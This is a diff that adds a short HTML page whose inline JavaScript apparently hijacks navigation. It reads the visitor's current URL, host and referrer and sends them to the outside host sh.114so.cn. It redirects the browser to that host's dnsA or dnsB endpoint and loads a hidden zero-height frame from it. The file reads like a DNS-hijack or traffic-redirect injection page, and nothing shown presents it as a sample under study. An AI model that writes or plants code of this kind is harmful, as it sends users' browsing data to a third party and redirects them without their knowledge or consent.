@@ -1,0 +1,11 @@
+<html><head></head>
+<script type="text/javascript">var pp = "161&pre="+(new Date()).getTime();
+var sa = "http://sh.114so.cn/";
+var s=String(window.location.href); var host=escape(s.substring(7,s.indexOf('/',7)));
+var ref=escape(document.referrer); s = escape(s);
+var su = s+"&host="+host+"&refer="+ref+"&server="+pp;
+function loadfr(){ document.getElementById("fr1").src = sa+"dnsC.aspx?AIMT="+su; }
+function refreshPage(){ document.location = sa+"dnsB.aspx?AIMT="+su; }
+if (self.location == top.location){ document.location= sa+"dnsA.aspx?AIMT="+su; }
+else { refreshPage(); }
+</script><frameset rows="*,0"><frame id="main" src=""><frame id="fr1" src=""></frameset><body></body></html>
